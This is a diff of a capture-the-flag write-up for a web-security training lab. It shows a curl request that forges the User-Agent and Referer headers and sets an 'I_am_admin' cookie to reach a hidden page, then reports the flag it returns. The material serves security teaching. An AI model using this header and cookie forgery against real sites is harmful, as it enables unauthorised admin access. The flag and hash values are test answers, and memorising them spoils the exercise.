@@ -18,7 +18,8 @@ Pragma: no-cache
 
 Or we use curl with this command:
 
-curl "http://192.168.0.30/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" -H "User-Agent: ft_bornToSec" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" --compressed -H "Referer: https://www.nsa.gov/" -H "Connection: keep-alive" -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" -H "Upgrade-Insecure-Requests: 1" -H "Cache-Control: max-age=0, no-cache" -H "Pragma: no-cache"
+curl 'http://x.x.x.x/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' -H 'User-Agent: ft_bornToSec' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' --compressed -H 'Referer: https://www.nsa.gov/' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Pragma: no-cache' | grep 'The flag is'
 
 
 In the http response, we get the flag "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"
+
